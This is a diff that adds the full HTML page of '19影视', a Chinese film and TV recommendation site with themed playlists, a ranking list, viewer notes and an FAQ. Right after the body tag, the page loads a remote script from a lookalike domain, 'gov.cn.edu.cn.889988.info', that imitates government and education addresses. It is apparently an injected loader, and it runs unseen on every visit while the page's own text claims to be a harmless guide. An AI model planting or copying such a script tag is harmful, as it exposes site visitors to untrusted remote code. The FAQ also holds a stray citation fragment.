@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>19影视 - 19号放映厅：新片/热剧/新番/下饭/短剧/纪录片/修复/合家 | 19yingshi-h5</title>
+<meta name="description" content="19影视（19yingshi-h5.github.io）是19号放映厅母题的影视导航站：新片院线、热播剧集、新番动漫、下饭综艺、竖屏短剧、纪实纪录片、老片修复、全家合家，不知道看啥就进19号厅。">
+<meta name="keywords" content="19影视,19号放映厅,新片院线,热播剧集,新番动漫,下饭综艺,竖屏短剧,老片修复,全家合家,影视导航,19yingshi-h5">
+<meta name="author" content="19影视">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://19yingshi-h5.github.io/">
+<meta property="og:title" content="19影视 - 不知道看啥，就进 19 号厅">
+<meta property="og:description" content="新片、热剧、新番、下饭综艺、竖屏短剧、纪录片、老片修复、全家合家，19号厅全兜住。19影视不播盗版，只做兜底片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://19yingshi-h5.github.io/">
+<meta property="og:site_name" content="19影视">
+<meta name="msvalidate.01" content="BING_VERIFY_CODE">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"19影视",
+  "url":"https://19yingshi-h5.github.io/",
+  "description":"19影视是19号放映厅/兜底片单母题的影视导航站，覆盖电影、剧集、动漫、综艺、短剧、纪录片、少儿、老片修复与合家内容。"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"FAQPage",
+  "mainEntity":[
+    {
+      "@type":"Question",
+      "name":"19影视为什么叫19号厅？",
+      "acceptedAnswer":{"@type":"Answer","text":"“19”不是年份也不是版本号，是影厅编号。19号厅=兜底厅：你懒得挑、挑花眼、全家口味打架时，进来就能拿到新片/热剧/新番/下饭/短剧/纪录片/修复/合家八类兜底片单。"}
+    },
+    {
+      "@type":"Question",
+      "name":"19影视和1905电影网、壹玖影视有什么区别？",
+      "acceptedAnswer":{"@type":"Answer","text":"1905电影网是CCTV6官方新媒体平台，壹玖影视是民间片库站；19影视只是数字母题导航站：不点播、不解析、不卖会员，只把“闭眼不踩雷”的片子按厅号和排号递给你。"}
+    }
+  ]
+}
+</script>
+<style>
+:root{
+  --bg:#0e1426;
+  --card:#161f38;
+  --ink:#eef3ff;
+  --muted:#9fb0c8;
+  --red:#ff4d5e;
+  --amber:#ffb347;
+  --white:#eef3ff;
+  --cyan:#39d0c8;
+  --corn:#ffd479;
+  --line:rgba(255,77,94,.30);
+  --shadow:0 18px 44px rgba(0,0,0,.55);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(720px 360px at 88% -8%,rgba(255,179,71,.18),transparent 60%),
+    radial-gradient(620px 320px at 8% 6%,rgba(57,208,200,.14),transparent 55%),
+    linear-gradient(180deg,#0e1426 0%,#111a30 56%,#080c18 100%);
+  color:var(--ink);line-height:1.78;
+}
+a{color:inherit;text-decoration:none}
+
+.s19-top{position:sticky;top:0;z-index:999;background:rgba(14,20,38,.93);backdrop-filter:blur(10px);border-bottom:2px solid var(--red)}
+.s19-top__in{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.68rem 1rem}
+.s19-logo{font-weight:900;font-size:1.2rem}
+.s19-logo b{color:var(--red)}
+.s19-logo i{color:var(--muted);font-style:normal;font-size:.76rem;background:rgba(255,77,94,.14);padding:.1rem .45rem;border-radius:8px}
+.s19-nav{display:flex;gap:.3rem}
+.s19-nav a{padding:.42rem .8rem;border-radius:20px;font-size:.9rem;color:var(--muted);font-weight:700}
+.s19-nav a:hover{background:rgba(255,77,94,.16);color:var(--white)}
+.s19-burger{display:none;flex-direction:column;gap:4px;cursor:pointer}
+.s19-burger span{width:22px;height:2px;background:var(--red);border-radius:2px}
+
+.s19-hero{max-width:1180px;margin:0 auto;padding:3.4rem 1rem 2.6rem;text-align:center;overflow:hidden}
+.s19-seat{width:120px;height:84px;margin:0 auto 1.1rem;border-radius:14px;background:linear-gradient(180deg,#1b2540,#0e1426);border:1px solid var(--line);position:relative;display:flex;align-items:center;justify-content:center}
+.s19-seat b{font-size:2.4rem;color:var(--amber);font-family:ui-monospace,monospace;text-shadow:0 0 18px rgba(255,179,71,.6)}
+.s19-seat::before{content:"🎞️";position:absolute;left:-26px;top:-18px;font-size:1.5rem;filter:drop-shadow(0 0 8px rgba(57,208,200,.6))}
+.s19-seat::after{content:"🍿";position:absolute;right:-26px;bottom:-18px;font-size:1.4rem}
+.s19-hero h1{font-size:clamp(2rem,5vw,3rem);line-height:1.22;margin-bottom:1rem}
+.s19-hero h1 em{font-style:normal;color:var(--amber)}
+.s19-hero h1 u{text-decoration:none;color:var(--red)}
+.s19-hero p{color:var(--muted);max-width:720px;margin:0 auto 1.8rem}
+.s19-cta{display:inline-flex;gap:.5rem;align-items:center;padding:.85rem 2rem;border-radius:30px;font-weight:800;color:#0e1426;background:linear-gradient(90deg,var(--corn),var(--amber),var(--red));box-shadow:var(--shadow)}
+.s19-dim{color:var(--red);font-size:.78rem;letter-spacing:3px;font-family:ui-monospace,monospace;margin-bottom:.5rem}
+
+.s19-sec{max-width:1180px;margin:0 auto;padding:3.1rem 1rem}
+.s19-head{margin-bottom:1.6rem;text-align:center}
+.s19-head .no{font-size:.72rem;color:var(--amber);letter-spacing:3px;font-family:ui-monospace,monospace}
+.s19-head h2{font-size:clamp(1.4rem,3.4vw,2.1rem);font-weight:900;margin-top:.3rem}
+.s19-head h2 i{color:var(--red);font-style:normal}
+.s19-head p{color:var(--muted);margin-top:.35rem;font-size:.92rem}
+
+.s19-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:.9rem}
+.s19-cell{border-radius:18px;padding:1.3rem 1rem;background:var(--card);text-align:center;transition:.25s;border:1px solid var(--line)}
+.s19-cell:hover{transform:translateY(-5px);box-shadow:var(--shadow)}
+.s19-cell .ic{font-size:1.9rem}
+.s19-cell h3{font-size:.98rem;margin:.45rem 0 .25rem;font-weight:800}
+.s19-cell p{font-size:.74rem;color:var(--muted)}
+
+.s19-ch{display:grid;grid-template-columns:repeat(8,1fr);gap:.7rem}
+.s19-c{border-radius:14px;padding:1rem .3rem;background:var(--card);text-align:center;border:1px solid var(--line);transition:.25s}
+.s19-c:hover{transform:translateY(-3px);background:rgba(255,77,94,.12)}
+.s19-c .ic{font-size:1.5rem}
+.s19-c h3{font-size:.78rem;margin-top:.3rem;font-weight:700}
+.s19-c p{font-size:.6rem;color:var(--muted)}
+
+.s19-rank{display:grid;gap:1.1rem}
+.s19-item{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:1.1rem 1.2rem}
+.s19-item h3{font-size:1.02rem;display:flex;justify-content:space-between;margin-bottom:.55rem;font-weight:800}
+.s19-item h3 span{color:var(--amber)}
+.s19-bar{height:16px;border-radius:999px;background:#080c18;overflow:hidden;position:relative;border:1px solid var(--line)}
+.s19-bar i{display:block;height:100%;background:linear-gradient(90deg,var(--cyan),var(--amber),var(--red))}
+.s19-bar i::after{content:"🎟️";position:absolute;right:5px;top:-2px;font-size:.8rem}
+
+.s19-notes{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:1.1rem}
+.s19-note{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:1.2rem}
+.s19-note .tag{font-size:.7rem;padding:.2rem .6rem;border-radius:8px;font-weight:800}
+.s19-note.pick .tag{background:rgba(255,77,94,.18);color:var(--red)}
+.s19-note.rice .tag{background:rgba(255,179,71,.18);color:var(--amber)}
+.s19-note.kid .tag{background:rgba(255,212,121,.20);color:var(--corn)}
+.s19-note.old .tag{background:rgba(57,208,200,.18);color:var(--cyan)}
+.s19-note h3{font-size:.96rem;margin:.55rem 0 .35rem;font-weight:800}
+.s19-note p{font-size:.8rem;color:var(--muted)}
+
+.s19-about{background:linear-gradient(160deg,#1a2440,#0e1426);border:2px solid var(--red);border-radius:26px;padding:2.4rem}
+.s19-about h2{font-size:1.9rem;margin-bottom:.8rem;font-weight:900}
+.s19-about h2 u{color:var(--amber);text-decoration:none}
+.s19-about p{color:var(--muted);margin-bottom:1rem}
+.s19-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin-top:1.4rem}
+.s19-stat{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:1.1rem;text-align:center}
+.s19-stat b{font-size:1.35rem;color:var(--amber);display:block}
+.s19-stat span{font-size:.76rem;color:var(--muted)}
+
+.s19-faq details{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:.2rem 1.1rem;margin-bottom:.7rem}
+.s19-faq summary{cursor:pointer;padding:.85rem 0;font-weight:800}
+.s19-faq p{padding:0 0 .85rem;color:var(--muted)}
+
+.s19-foot{border-top:2px solid var(--red);background:#080c18;padding:2.2rem 1rem;text-align:center;color:var(--muted);font-size:.86rem}
+.s19-foot a{color:var(--amber)}
+.s19-foot__links{display:flex;gap:1.1rem;justify-content:center;flex-wrap:wrap;margin-bottom:1rem}
+.s19-foot__links a{font-size:.84rem}
+
+@media(max-width:980px){
+  .s19-grid{grid-template-columns:repeat(2,1fr)}
+  .s19-ch{grid-template-columns:repeat(4,1fr)}
+  .s19-notes{grid-template-columns:1fr 1fr}
+  .s19-stats{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:640px){
+  .s19-nav{display:none;position:absolute;top:56px;left:0;right:0;flex-direction:column;gap:0;background:rgba(14,20,38,.99);border-bottom:2px solid var(--red)}
+  .s19-nav.show{display:flex}
+  .s19-nav a{padding:.85rem 1rem;border-bottom:1px solid #233052}
+  .s19-burger{display:flex}
+  .s19-grid{grid-template-columns:1fr}
+  .s19-ch{grid-template-columns:repeat(3,1fr)}
+  .s19-notes{grid-template-columns:1fr}
+  .s19-stats{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="s19-top">
+  <div class="s19-top__in">
+    <div class="s19-logo">🎟️ 19<b>影视</b> <i>·19号放映厅</i></div>
+    <nav class="s19-nav" id="s19Nav">
+      <a href="#home">19号厅</a>
+      <a href="#list">19系片单</a>
+      <a href="#ch">19号频道</a>
+      <a href="#rank">19排榜</a>
+      <a href="#notes">厅内手记</a>
+      <a href="#about">关于19影视</a>
+    </nav>
+    <div class="s19-burger" onclick="document.getElementById('s19Nav').classList.toggle('show')">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<section class="s19-hero" id="home">
+  <div class="s19-seat"><b>19</b></div>
+  <p class="s19-dim">// hall no.19 — fallback hall</p>
+  <h1>19影视：不知道看啥，<em>就进 19 号厅</em></h1>
+  <p>不是 1905，也不是“19影视APP 免费播”。19 是影厅号：新片、热剧、新番、下饭综艺、竖屏短剧、纪录片、老片修复、全家合家，八类片单一厅兜底。挑花眼了？闭眼进 19 号厅。</p>
+  <a class="s19-cta" href="#list">🎟️ 取 19 号票根</a>
+</section>
+
+<section class="s19-sec" id="list">
+  <div class="s19-head">
+    <div class="no">// hall 19 playlist</div>
+    <h2>19 系 <i>片单</i></h2>
+    <p>选择困难症的兜底分区：每类都能单独成厅，合起来就是 19 号厅。</p>
+  </div>
+  <div class="s19-grid">
+    <div class="s19-cell"><div class="ic">🎬</div><h3>新片·院线</h3><p>《沙丘2》《奥本海默》《坠落的审判》</p></div>
+    <div class="s19-cell"><div class="ic">📺</div><h3>热播·剧集</h3><p>《漫长的季节》《我的阿勒泰》《黑暗荣耀》</p></div>
+    <div class="s19-cell"><div class="ic">🍥</div><h3>新番·动漫</h3><p>《葬送的芙莉莲》《迷宫饭》《药屋少女的呢喃》</p></div>
+    <div class="s19-cell"><div class="ic">🍚</div><h3>下饭·综艺</h3><p>《快乐再出发》《种地吧》《舞台2026》</p></div>
+    <div class="s19-cell"><div class="ic">📱</div><h3>竖屏·短剧</h3><p>逆袭/重生/霸总/悬疑，马桶时间专用</p></div>
+    <div class="s19-cell"><div class="ic">🎞️</div><h3>纪实·纪录片</h3><p>《孩童星球》《地球脉动》《翻山涉水上学路》</p></div>
+    <div class="s19-cell"><div class="ic">🛠️</div><h3>老片·修复</h3><p>《小城之春》《罗马假日》《龙门客栈》4K</p></div>
+    <div class="s19-cell"><div class="ic">🛋️</div><h3>全家·合家</h3><p>《寻梦环游记》《狮子王》《摔跤吧爸爸》</p></div>
+  </div>
+</section>
+
+<section class="s19-sec" id="ch">
+  <div class="s19-head">
+    <div class="no">// hall 19 channels</div>
+    <h2>19 号 <i>频道</i></h2>
+    <p>八块银幕同时亮，总有一块不刺眼。</p>
+  </div>
+  <div class="s19-ch">
+    <div class="s19-c"><div class="ic">🎬</div><h3>电影</h3><p>院线/作者/老片</p></div>
+    <div class="s19-c"><div class="ic">📺</div><h3>剧集</h3><p>国/韩/美/日/泰</p></div>
+    <div class="s19-c"><div class="ic">🍥</div><h3>动漫</h3><p>新番/国漫/治愈</p></div>
+    <div class="s19-c"><div class="ic">🎤</div><h3>综艺</h3><p>慢综/竞演/访谈</p></div>
+    <div class="s19-c"><div class="ic">⚡</div><h3>短剧</h3><p>逆袭/甜/悬疑</p></div>
+    <div class="s19-c"><div class="ic">🎞️</div><h3>纪录片</h3><p>自然/城市/手艺</p></div>
+    <div class="s19-c"><div class="ic">🧒</div><h3>少儿</h3><p>动画/早教/儿歌</p></div>
+    <div class="s19-c"><div class="ic">🛠️</div><h3>修复</h3><p>4K/上色/声轨</p></div>
+  </div>
+</section>
+
+<section class="s19-sec" id="rank">
+  <div class="s19-head">
+    <div class="no">// row 19 safe picks</div>
+    <h2>19 排 <i>热度榜</i></h2>
+    <p>第 19 排=“闭眼点不踩雷”：上座率、二刷率、下饭适配、合家适配加权。</p>
+  </div>
+  <div class="s19-rank">
+    <div class="s19-item"><h3>1. 漫长的季节 <span>19排 98%</span></h3><div class="s19-bar"><i style="width:98%"></i></div></div>
+    <div class="s19-item"><h3>2. 我的阿勒泰 <span>19排 97%</span></h3><div class="s19-bar"><i style="width:97%"></i></div></div>
+    <div class="s19-item"><h3>3. 寻梦环游记 <span>19排 96%</span></h3><div class="s19-bar"><i style="width:96%"></i></div></div>
+    <div class="s19-item"><h3>4. 葬送的芙莉莲 <span>19排 95%</span></h3><div class="s19-bar"><i style="width:95%"></i></div></div>
+    <div class="s19-item"><h3>5. 小城之春(修复) <span>19排 94%</span></h3><div class="s19-bar"><i style="width:94%"></i></div></div>
+  </div>
+</section>
+
+<section class="s19-sec" id="notes">
+  <div class="s19-head">
+    <div class="no">// hall 19 audience</div>
+    <h2>厅内 <i>手记</i></h2>
+  </div>
+  <div class="s19-notes">
+    <article class="s19-note pick">
+      <span class="tag">🎫 选择困难户</span>
+      <h3>别挑了，进 19 号厅</h3>
+      <p>打开片单三秒没决定，就点“19排榜”第一名。19影视存在的意义就是：把“今晚看啥”这个哲学问题，降级成“闭眼按播放”。</p>
+    </article>
+    <article class="s19-note rice">
+      <span class="tag">🍚 下饭人</span>
+      <h3>综艺+剧集，别点烧脑</h3>
+      <p>吃饭别看《记忆碎片》《咒》《看不见的客人》。19号厅的下饭槽只放《请回答1988》《快乐再出发》《武林外传》——嚼得动，笑得出，不噎着。</p>
+    </article>
+    <article class="s19-note kid">
+      <span class="tag">🧒 带娃家长</span>
+      <h3>全家槽先过一遍</h3>
+      <p>《寻梦环游记》《狮子王》《猫的报恩》《帕丁顿熊》进全家槽；悬疑/惊悚/阴风片单默认折叠。19号厅不让小孩在座位上捂眼睛。</p>
+    </article>
+    <article class="s19-note old">
+      <span class="tag">🎞️ 老影迷</span>
+      <h3>修复厅才是主场</h3>
+      <p>新片看腻了就看《小城之春》《罗马假日》《龙门客栈》4K修复。老影迷要的不是爽，是“原来那一帧当年就这么讲究”。19号厅把修复厅留在最里面。</p>
+    </article>
+  </div>
+</section>
+
+<section class="s19-sec" id="about">
+  <div class="s19-about">
+    <h2>关于 <u>19影视</u></h2>
+    <p>
+      19影视（19yingshi-h5.github.io）不是 1905 电影网，也不是“19影视破解版”。它是一间编号厅：票根红做门头、放映机琥珀打光、深厅蓝压住背景、通道青指路、爆米花黄标下饭。
+    </p>
+    <p>
+      新片院线、热播剧集、新番动漫、下饭综艺、竖屏短剧、纪实纪录片、老片修复、全家合家——八类片单就是 19 号厅的八块银幕。本站只导航，正片去正版平台；你只管坐第 19 排，闭眼不踩雷。
+    </p>
+    <div class="s19-stats">
+      <div class="s19-stat"><b>19 号厅</b><span>兜底厅 / 选择困难专用</span></div>
+      <div class="s19-stat"><b>8 银幕</b><span>新片/剧/漫/综/短剧/纪录/修复/合家</span></div>
+      <div class="s19-stat"><b>第19排</b><span>闭眼点不踩雷</span></div>
+      <div class="s19-stat"><b>0 解析</b><span>不播盗版，不卖会员</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="s19-sec s19-faq">
+  <div class="s19-head">
+    <div class="no">// hall 19 q & a</div>
+    <h2>19 号厅 <i>问答</i></h2>
+  </div>
+  <details open>
+    <summary>19影视是不是“19影视大全/19影视APP”那种聚合站？</summary>
+    <p>不是。聚合站靠解析线路和广告活；19影视是“19号放映厅”母题的导航站，只做片单、榜单和观众手记，不提供播放源、不挂第三方解析、不引导下载 APK。</p>
+  </details>
+  <details>
+    <summary>和月光/风行/加菲猫影视差在哪？</summary>
+    <p>月光=月相心情，风行=场景流动，加菲猫=胖橘反内耗，19影视=兜底厅：别人讲“该用什么状态看”，19影视讲“你懒得想了，直接坐第19排”。它是选择困难症的最终按钮。[1,4](@ref)</p>
+  </details>
+  <details>
+    <summary>短剧和惊悚片会不会混在一起？</summary>
+    <p>不会。竖屏短剧归“竖屏·短剧”槽，惊悚/悬疑归“新片/纪录”里单独标强度；全家槽默认不出现红标内容。19号厅的规则是：爆米花和尖叫不能坐同一排。</p>
+  </details>
+</section>
+
+<footer class="s19-foot">
+  <div class="s19-foot__links">
+    <a href="#list">19系片单</a>
+    <a href="#ch">19号频道</a>
+    <a href="#rank">19排榜</a>
+    <a href="#notes">厅内手记</a>
+    <a href="#about">关于19影视</a>
+    <a href="#">免责声明</a>
+  </div>
+  <p>© 2026 <a href="https://19yingshi-h5.github.io">19影视</a> · 19yingshi-h5.github.io</p>
+  <p>19影视 —— 不知道看啥，就进 19 号厅。本站为影视导航站，不提供盗版播放。</p>
+</footer>
+
+<script>
+document.querySelectorAll('.s19-nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('s19Nav').classList.remove('show');
+  });
+});
+</script>
+
+</body>
+</html>
